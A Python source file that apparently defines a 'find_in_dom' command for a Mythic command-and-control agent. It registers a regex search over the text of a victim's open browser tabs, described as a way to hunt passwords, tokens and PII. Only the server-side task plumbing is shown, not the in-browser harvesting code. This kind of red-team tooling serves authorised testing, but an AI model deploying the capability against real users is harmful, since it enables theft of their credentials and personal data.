from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class FindInDomArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pattern",
                type=ParameterType.String,
                description="JavaScript regex pattern to search for across all open tab DOMs",
            ),
            CommandParameter(
                name="flags",
                type=ParameterType.String,
                description="Regex flags (default: gi)",
                default_value="gi",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line.strip():
            stripped = self.command_line.strip()
            if stripped.startswith("{"):
                self.load_args_from_json_string(stripped)
            else:
                self.add_arg("pattern", stripped)


class FindInDomCommand(CommandBase):
    cmd            = "find_in_dom"
    needs_admin    = False
    help_cmd       = "find_in_dom <pattern>"
    description    = (
        "Search the visible text of all open tabs using a JavaScript regex. "
        "Returns up to 50 unique matches per tab. Useful for hunting passwords, "
        "tokens, PII, or any string pattern across the victim's browsing session."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = FindInDomArguments
    parameters     = []
    attackmapping  = ["T1552", "T1005"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        pattern = task.args.get_arg("pattern")
        flags   = task.args.get_arg("flags")
        task.display_params = f"/{pattern}/{flags}"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
